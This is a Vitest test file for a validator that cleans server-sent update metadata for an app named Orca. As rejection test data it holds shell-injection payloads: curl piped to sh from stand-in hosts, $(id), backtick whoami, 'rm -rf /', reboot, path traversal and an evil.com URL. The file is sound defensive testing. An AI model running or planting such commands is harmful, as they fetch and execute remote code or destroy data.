import { describe, expect, it } from 'vitest'

import type { RuntimeUpdateInfo } from './runtime-types'
import {
  DEFAULT_INSTALL_PATH,
  DEFAULT_SERVICE_NAME,
  validateRuntimeUpdateInfo
} from './runtime-update-info-validation'

// Cast arbitrary garbage to the declared type — a compromised server is not
// bound by TypeScript, so the validator must survive non-string fields too.
const asUpdateInfo = (value: unknown): RuntimeUpdateInfo => value as RuntimeUpdateInfo

describe('validateRuntimeUpdateInfo defaults', () => {
  it('yields the documented defaults for wholly-undefined input', () => {
    const result = validateRuntimeUpdateInfo(undefined)
    expect(result).toEqual({
      serviceName: DEFAULT_SERVICE_NAME,
      installPath: DEFAULT_INSTALL_PATH,
      installKind: 'unknown',
      restartKind: 'unknown'
    })
  })

  it('treats null input the same as absent', () => {
    expect(validateRuntimeUpdateInfo(null)).toEqual({
      serviceName: DEFAULT_SERVICE_NAME,
      installPath: DEFAULT_INSTALL_PATH,
      installKind: 'unknown',
      restartKind: 'unknown'
    })
  })

  it('does not throw on non-string garbage in every field', () => {
    const result = validateRuntimeUpdateInfo(
      asUpdateInfo({
        currentVersion: 42,
        latestVersion: {},
        updateAvailable: 'yes',
        installKind: 123,
        restartKind: [],
        serviceName: false,
        installPath: 0,
        hostArch: null,
        docsUrl: 99
      })
    )
    expect(result).toEqual({
      serviceName: DEFAULT_SERVICE_NAME,
      installPath: DEFAULT_INSTALL_PATH,
      installKind: 'unknown',
      restartKind: 'unknown'
    })
  })

  it('accepts the documented defaults when a server echoes them back', () => {
    const result = validateRuntimeUpdateInfo({
      serviceName: 'orca-serve.service',
      installPath: '/opt/orca/orca-linux.AppImage'
    })
    expect(result.serviceName).toBe('orca-serve.service')
    expect(result.installPath).toBe('/opt/orca/orca-linux.AppImage')
  })
})

describe('validateRuntimeUpdateInfo serviceName', () => {
  it('accepts orca-prefixed unit names', () => {
    expect(validateRuntimeUpdateInfo({ serviceName: 'orca-serve.service' }).serviceName).toBe(
      'orca-serve.service'
    )
    expect(validateRuntimeUpdateInfo({ serviceName: 'orca.service' }).serviceName).toBe(
      'orca.service'
    )
    expect(validateRuntimeUpdateInfo({ serviceName: 'orca@host:1.service' }).serviceName).toBe(
      'orca@host:1.service'
    )
  })

  it('rejects non-orca unit names and falls back to the default', () => {
    for (const name of ['sshd.service', 'docker.service', 'x.service']) {
      expect(validateRuntimeUpdateInfo({ serviceName: name }).serviceName).toBe(
        DEFAULT_SERVICE_NAME
      )
    }
  })

  it('rejects systemd flag-like names', () => {
    for (const name of ['--user.service', '-H.service']) {
      expect(validateRuntimeUpdateInfo({ serviceName: name }).serviceName).toBe(
        DEFAULT_SERVICE_NAME
      )
    }
  })

  it('rejects shell-metacharacter and injection payloads', () => {
    const payloads = [
      'orca; curl evil.sh | sh.service',
      'orca`whoami`.service',
      'orca$(id).service',
      'orca serve.service',
      "orca'.service",
      'orca".service',
      'orca-serve.service\n',
      'orca && reboot.service'
    ]
    for (const name of payloads) {
      expect(validateRuntimeUpdateInfo({ serviceName: name }).serviceName).toBe(
        DEFAULT_SERVICE_NAME
      )
    }
  })

  it('rejects a name missing the .service suffix', () => {
    expect(validateRuntimeUpdateInfo({ serviceName: 'orca-serve' }).serviceName).toBe(
      DEFAULT_SERVICE_NAME
    )
  })
})

describe('validateRuntimeUpdateInfo installPath', () => {
  it('accepts an absolute AppImage path', () => {
    expect(
      validateRuntimeUpdateInfo({ installPath: '/home/user/apps/orca-linux.AppImage' }).installPath
    ).toBe('/home/user/apps/orca-linux.AppImage')
  })

  it('rejects a non-absolute path', () => {
    expect(validateRuntimeUpdateInfo({ installPath: 'orca-linux.AppImage' }).installPath).toBe(
      DEFAULT_INSTALL_PATH
    )
  })

  it('rejects a path without the .AppImage suffix', () => {
    for (const path of ['/opt/orca/orca-linux', '/opt/orca/orca.deb', '/usr/bin/orca']) {
      expect(validateRuntimeUpdateInfo({ installPath: path }).installPath).toBe(
        DEFAULT_INSTALL_PATH
      )
    }
  })

  it('rejects path traversal and shell-metacharacter payloads', () => {
    const payloads = [
      '/opt/orca/../../etc/orca-linux.AppImage',
      '/opt/orca/$(id).AppImage',
      '/opt/orca/`whoami`.AppImage',
      '/opt/orca/orca linux.AppImage',
      '/opt/orca/orca;rm.AppImage',
      "/opt/orca/orca'.AppImage",
      '/opt/orca/orca.AppImage\n',
      '/opt/orca/orca.AppImage; sudo rm -rf /'
    ]
    for (const path of payloads) {
      expect(validateRuntimeUpdateInfo({ installPath: path }).installPath).toBe(
        DEFAULT_INSTALL_PATH
      )
    }
  })

  it('accepts documented path characters (~ + . _ -)', () => {
    const path = '/opt/orca_v2/orca-linux+arm.AppImage'
    expect(validateRuntimeUpdateInfo({ installPath: path }).installPath).toBe(path)
  })

  it('accepts a dotted directory segment that is not a traversal', () => {
    const path = '/opt/orca/sub.dir/orca-linux.AppImage'
    expect(validateRuntimeUpdateInfo({ installPath: path }).installPath).toBe(path)
  })
})

describe('validateRuntimeUpdateInfo versions', () => {
  it('accepts semver and prerelease strings', () => {
    const result = validateRuntimeUpdateInfo({
      currentVersion: '1.2.3',
      latestVersion: '1.2.3-beta.1'
    })
    expect(result.currentVersion).toBe('1.2.3')
    expect(result.latestVersion).toBe('1.2.3-beta.1')
  })

  it('omits versions carrying injection payloads', () => {
    const payloads = [
      '1.2.3; curl evil | sh',
      '1.2.3`id`',
      '1.2.3$(reboot)',
      '1.2',
      'v1.2.3',
      '1.2.3\n',
      '1.2.3 && rm -rf /'
    ]
    for (const version of payloads) {
      const result = validateRuntimeUpdateInfo({
        currentVersion: version,
        latestVersion: version
      })
      expect(result.currentVersion).toBeUndefined()
      expect(result.latestVersion).toBeUndefined()
    }
  })
})

describe('validateRuntimeUpdateInfo docsUrl', () => {
  it('accepts a path under stablyai/orca', () => {
    expect(
      validateRuntimeUpdateInfo({ docsUrl: 'https://github.com/stablyai/orca/releases' }).docsUrl
    ).toBe('https://github.com/stablyai/orca/releases')
    expect(validateRuntimeUpdateInfo({ docsUrl: 'https://github.com/stablyai/orca' }).docsUrl).toBe(
      'https://github.com/stablyai/orca'
    )
  })

  it('rejects a parsed-pathname traversal to another repo', () => {
    expect(
      validateRuntimeUpdateInfo({
        docsUrl: 'https://github.com/stablyai/orca/../evil'
      }).docsUrl
    ).toBeUndefined()
  })

  it('rejects sibling repo names sharing the prefix', () => {
    expect(
      validateRuntimeUpdateInfo({ docsUrl: 'https://github.com/stablyai/orca-foo' }).docsUrl
    ).toBeUndefined()
  })

  it('rejects a non-https origin', () => {
    expect(
      validateRuntimeUpdateInfo({ docsUrl: 'http://github.com/stablyai/orca' }).docsUrl
    ).toBeUndefined()
  })

  it('rejects a different host', () => {
    expect(
      validateRuntimeUpdateInfo({ docsUrl: 'https://evil.com/stablyai/orca' }).docsUrl
    ).toBeUndefined()
  })

  it('rejects an unparseable url', () => {
    expect(validateRuntimeUpdateInfo({ docsUrl: 'not a url' }).docsUrl).toBeUndefined()
  })
})

describe('validateRuntimeUpdateInfo enums and flags', () => {
  it('passes through recognized install and restart kinds', () => {
    const result = validateRuntimeUpdateInfo({
      installKind: 'linux-appimage',
      restartKind: 'systemd'
    })
    expect(result.installKind).toBe('linux-appimage')
    expect(result.restartKind).toBe('systemd')
  })

  it('maps unrecognized enum values to unknown', () => {
    const result = validateRuntimeUpdateInfo(
      asUpdateInfo({ installKind: 'gentoo-ebuild', restartKind: 'launchd' })
    )
    expect(result.installKind).toBe('unknown')
    expect(result.restartKind).toBe('unknown')
  })

  it('accepts only x64 and arm64 for hostArch', () => {
    expect(validateRuntimeUpdateInfo({ hostArch: 'x64' }).hostArch).toBe('x64')
    expect(validateRuntimeUpdateInfo({ hostArch: 'arm64' }).hostArch).toBe('arm64')
  })

  it('omits garbage hostArch values', () => {
    for (const arch of ['x86', 'ia32', 'riscv64', '', 'x64; rm']) {
      expect(validateRuntimeUpdateInfo({ hostArch: arch }).hostArch).toBeUndefined()
    }
  })

  it('passes through only a literal boolean updateAvailable', () => {
    expect(validateRuntimeUpdateInfo({ updateAvailable: true }).updateAvailable).toBe(true)
    expect(validateRuntimeUpdateInfo({ updateAvailable: false }).updateAvailable).toBe(false)
    expect(validateRuntimeUpdateInfo({ updateAvailable: null }).updateAvailable).toBeUndefined()
    expect(
      validateRuntimeUpdateInfo(asUpdateInfo({ updateAvailable: 'true' })).updateAvailable
    ).toBeUndefined()
  })
})
